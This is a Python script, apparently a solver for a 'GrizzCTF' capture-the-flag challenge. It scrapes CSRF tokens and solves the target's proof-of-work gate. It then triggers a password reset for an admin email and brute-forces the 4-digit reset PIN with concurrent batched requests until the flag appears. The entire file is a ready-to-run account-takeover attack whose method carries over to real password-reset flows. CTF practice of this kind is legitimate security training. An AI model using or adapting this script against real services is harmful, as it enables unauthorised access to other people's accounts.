#!/usr/bin/env python3
import asyncio
import aiohttp
import hashlib
import re
import string
import random
import time
from dataclasses import dataclass
from bs4 import BeautifulSoup

@dataclass
class Term:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    RESET_ALL = '\033[0m'


class CTFSolver:
    def __init__(self, url):
        self.base_url = url.rstrip('/')
        self.session = None
        # Allowed characters for the 8-character PoW solution
        self.charset = string.ascii_letters + string.digits

    async def init_session(self):
        self.session = aiohttp.ClientSession()

    async def close_session(self):
        if self.session:
            await self.session.close()

    def extract_csrf_token(self, html_content: str) -> str:
        soup = BeautifulSoup(html_content, 'html.parser')
        hidden_input = soup.find('input', attrs={'name': 'csrf_token'})
        return hidden_input['value'] if hidden_input else None

    async def get_pow_challenge(self):
        async with self.session.get(f"{self.base_url}/pow") as resp:
            html = await resp.text()

        match = re.search(r'Challenge String:</strong>\s*<code>([a-f0-9]+)</code>', html)
        if not match:
            raise RuntimeError("Failed to extract PoW challenge string.")
        challenge_str = match.group(1)

        csrf_token = self.extract_csrf_token(html)
        if not csrf_token:
            raise RuntimeError("Failed to extract CSRF token for PoW form.")

        return challenge_str, csrf_token

    async def solve_pow_locally(self, challenge_str, difficulty=2) -> str:
        """ Brute force an 8-char solution with leading zeros in SHA256. """
        target = '0' * difficulty
        start_time = time.time()
        attempts = 0
        while True:
            attempts += 1
            candidate = ''.join(random.choices(self.charset, k=8))
            h = hashlib.sha256((challenge_str + candidate).encode()).hexdigest()
            if h.startswith(target):
                elapsed = time.time() - start_time
                print(f"{Term.BOLD}{Term.UNDERLINE}{Term.GREEN}[+] PoW solved in {attempts} attempts ({elapsed:.2f}s){Term.END}")
                print(f"{Term.BOLD}[+]\tSolution = {candidate}{Term.END}")
                print(f"{Term.BOLD}[+]\tHash = {h}{Term.END}")
                return candidate

            if attempts % 500000 == 0:
                print(f"{Term.YELLOW}[-] PoW attempts so far: {attempts}...{Term.END}", end='\r')

    async def submit_pow_solution(self, solution, csrf_token):
        data = {
            'csrf_token': csrf_token,
            'solution': solution
        }
        async with self.session.post(
            f"{self.base_url}/pow", data=data, allow_redirects=True
        ) as resp:
            html = await resp.text()

        if 'Proof of Work challenge solved successfully!' in html:
            print("[+] Server accepted our PoW solution.")
            return True
        else:
            print("[-] Server did not accept the PoW solution.")
            return False

    async def forgot_password_for_admin(self):
        print(f"{Term.BOLD}{Term.UNDERLINE}{Term.YELLOW}[*] Attempting forgot-password for admin@secureauth.com...{Term.END}")
        async with self.session.get(f"{self.base_url}/forgot-password") as resp:
            get_html = await resp.text()

        csrf = self.extract_csrf_token(get_html)
        if not csrf:
            print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[-] Could not extract CSRF token from /forgot-password.{Term.END}")
            return

        data = {
            'csrf_token': csrf,
            'email': 'admin@secureauth.com'
        }
        async with self.session.post(
            f"{self.base_url}/forgot-password", data=data, allow_redirects=True
        ) as resp:
            post_html = await resp.text()

        if 'If an account exists with this email' in post_html:
            print(f"{Term.BOLD}{Term.UNDERLINE}{Term.GREEN}[+] Successfully triggered forgot-password for admin@secureauth.com.{Term.END}")
        else:
            print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[-] Something went wrong with forgot-password step.{Term.END}")

    async def try_pin(self, pin: int):
        """
        Single pin attempt: GET /verify-pin => parse CSRF => POST pin => check result.
        We handle CancelledError gracefully in case we get canceled mid-request.
        """
        try:
            async with self.session.get(f"{self.base_url}/verify-pin") as get_resp:
                get_html = await get_resp.text()

            csrf = self.extract_csrf_token(get_html)
            if not csrf:
                return False, pin, None

            data = {
                'csrf_token': csrf,
                'pin': f"{pin:04d}"
            }
            async with self.session.post(
                f"{self.base_url}/verify-pin", data=data, allow_redirects=True
            ) as resp:
                text = await resp.text()

            if 'GrizzCTF{' in text:
                match = re.search(r'(GrizzCTF\{[^}]+\})', text)
                found_flag = match.group(1) if match else "UnknownFlag"
                return True, pin, found_flag

            return False, pin, None

        except asyncio.CancelledError:
            # If we are canceled (because another thread found the solution),
            # just exit gracefully from this task.
            return False, pin, None

    async def brute_force_pin_range(self, start_pin, end_pin):
        """Brute force [start_pin, end_pin) with concurrency for each chunk of pins."""
        batch_size = 20
        print(f"{Term.BOLD}{Term.UNDERLINE}{Term.YELLOW}[*] Brute-forcing PINs {start_pin:04d}–{end_pin-1:04d}...{Term.END}")

        start_time = time.time()
        total_attempts = 0

        # We'll gather with return_exceptions=True so canceled tasks won't blow up
        for current_start in range(start_pin, end_pin, batch_size):
            tasks = []
            for p in range(current_start, min(current_start + batch_size, end_pin)):
                tasks.append(asyncio.create_task(self.try_pin(p)))

            # If one or more tasks are canceled (due to a found solution in meet_in_the_middle),
            # we won't raise an unhandled exception. We'll interpret it as "no success."
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_attempts += len(tasks)

            for r in results:
                # If a single result is an Exception object, skip it
                if isinstance(r, Exception):
                    continue  # It's likely CancelledError or something else
                success, candidate_pin, found_flag = r
                if success:
                    elapsed = time.time() - start_time
                    print(f"\n{Term.BOLD}{Term.UNDERLINE}{Term.GREEN}[+] Found valid PIN = {candidate_pin:04d}{Term.END}")
                    print(f"{Term.BOLD}[+]\tAttempts       = {total_attempts}")
                    print(f"{Term.BOLD}[+]\tTime           = {elapsed:.2f} s")
                    print(f"{Term.BOLD}[+]\tFlag           = {found_flag}")
                    return candidate_pin, found_flag

            print(f"[-] Tried PINs {current_start:04d}–{current_start+batch_size-1:04d}...", end='\r')

        print(f"\n[-] Range {start_pin:04d}–{end_pin-1:04d} exhausted with no success.")
        return None, None

    async def brute_force_pin_meet_in_the_middle(self):
        """
        We spawn tasks for each quarter of the range, wait for the FIRST_COMPLETED result,
        then cancel the others if we found the correct pin.
        """
        task1 = asyncio.create_task(self.brute_force_pin_range(1000, 2500))
        task2 = asyncio.create_task(self.brute_force_pin_range(2500, 5000))
        task3 = asyncio.create_task(self.brute_force_pin_range(5000, 7500))
        task4 = asyncio.create_task(self.brute_force_pin_range(7500, 10000))

        # Wait for the first half to see if they find a correct PIN
        done, pending = await asyncio.wait({task1, task2}, return_when=asyncio.FIRST_COMPLETED)

        for d in done:
            # If the done task found a solution, we get (pin, flag).
            pin, flag = await d
            if pin and flag:
                # Cancel the other tasks in the same group
                for p in pending:
                    p.cancel()
                return pin, flag

        # Otherwise, let’s check the second half
        done2, pending2 = await asyncio.wait({task3, task4}, return_when=asyncio.FIRST_COMPLETED)
        for d2 in done2:
            pin, flag = await d2
            if pin and flag:
                for p2 in pending2:
                    p2.cancel()
                return pin, flag

        return None, None

    async def solve(self):
        try:
            print(f"[*] Starting exploit against {self.base_url}")

            # Step 1: PoW
            challenge_str, csrf = await self.get_pow_challenge()
            print(f"{Term.BOLD}{Term.UNDERLINE}{Term.YELLOW}[+] PoW challenge: {challenge_str} | CSRF: {csrf}{Term.END}")

            # Step 2: Solve
            solution = await self.solve_pow_locally(challenge_str, difficulty=2)
            if not solution:
                print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[-] Could not solve PoW!{Term.END}")
                return

            # Step 3: Submit
            if not await self.submit_pow_solution(solution, csrf):
                print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[-] PoW submission failed.{Term.END}")
                return

            # Step 4: Optional
            await self.forgot_password_for_admin()

            # Step 5: Brute force PIN in parallel
            pin, flag = await self.brute_force_pin_meet_in_the_middle()
            if pin and flag:
                print(f"{Term.BOLD}{Term.UNDERLINE}{Term.GREEN}[+] Challenge completed successfully!{Term.END}")
                print(f"{Term.BOLD}[+] PIN  : {pin:04d}{Term.END}")
                print(f"{Term.BOLD}[+] FLAG : {flag}{Term.END}")
            else:
                print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[-] Failed to get the flag after brute forcing all PINs.{Term.END}")
        except Exception as exc:
            print(f"{Term.BOLD}{Term.UNDERLINE}{Term.RED}[!] Exception in solve(): {exc}{Term.END}")
        finally:
            await self.close_session()

async def main():
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    solver = CTFSolver(url)
    await solver.init_session()
    await solver.solve()

if __name__ == '__main__':
    asyncio.run(main())
